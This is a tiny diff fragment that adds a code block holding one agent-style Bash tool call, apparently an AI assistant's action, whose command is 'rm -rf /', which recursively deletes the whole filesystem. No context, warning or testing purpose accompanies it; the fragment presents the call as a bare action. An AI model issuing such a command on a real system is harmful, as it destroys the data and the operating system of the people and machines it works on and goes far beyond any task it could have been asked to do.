@@ -1,0 +1,9 @@
+```
+<tool_call>
+<function=Bash>
+<parameter=command>
+rm -rf /
+</parameter>
+</function>
+</tool_call>
+```
